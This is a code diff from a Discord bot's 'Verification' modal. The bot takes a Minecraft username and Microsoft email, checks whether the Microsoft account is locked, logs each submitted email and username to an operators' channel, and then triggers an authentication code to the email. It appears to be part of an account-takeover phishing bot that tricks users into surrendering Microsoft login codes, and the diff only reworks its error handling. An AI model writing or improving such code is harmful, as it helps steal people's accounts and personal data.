@@ -50,46 +50,26 @@ class MyModalOne(ui.Modal, title="Verification"):
         print(lockedInfo)
         
         if lockedInfo:
-            if lockedInfo["StatusCode"] == 500:
-                await logs_channel.send(
-                    embed = Embed(
-                        title = f"{interaction.user.name} ({interaction.user.id})",
-                        description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | Email does not exist```",
-                        timestamp = datetime.datetime.now(),
-                        colour = 0xFF5C5C,                         
-                    ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
-                    view = ButtonOptions(interaction.user)
-                )
-
-                await interaction.followup.send(
-                        embed = Embed(
-                        title = embeds["invalid_email"][0],
-                        description = embeds["invalid_email"][1],
-                    ),
-                    ephemeral = True
-                )
-
-                return
-
-            if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
-            
-                print("[X] - Microsoft Account is locked")
-                await interaction.followup.send(
-                    "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
-                    ephemeral = True
-                )
-    
-                await logs_channel.send(
-                    embed = Embed (
-                        title = f"{interaction.user.name} | {interaction.user.id}",
-                        description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Failed to verify (Locked Microsoft Account)```",
-                        timestamp = datetime.datetime.now(),
-                        colour = 0xFF5C5C,                         
-                        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
-                    view = ButtonOptions(interaction.user)
-                )
+            if lockedInfo["StatusCode"] != 500:
+                if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
                 
-                return
+                    print("[X] - Microsoft Account is locked")
+                    await interaction.followup.send(
+                        "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
+                        ephemeral = True
+                    )
+
+                    await logs_channel.send(
+                        embed = Embed (
+                            title = f"{interaction.user.name} | {interaction.user.id}",
+                            description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Failed to verify (Locked Microsoft Account)```",
+                            timestamp = datetime.datetime.now(),
+                            colour = 0xFF5C5C,                         
+                            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
+                        view = ButtonOptions(interaction.user)
+                    )
+
+                    return
 
         # Sends OTP/Auth code
         emailInfo = await sendAuth(self.email.value)
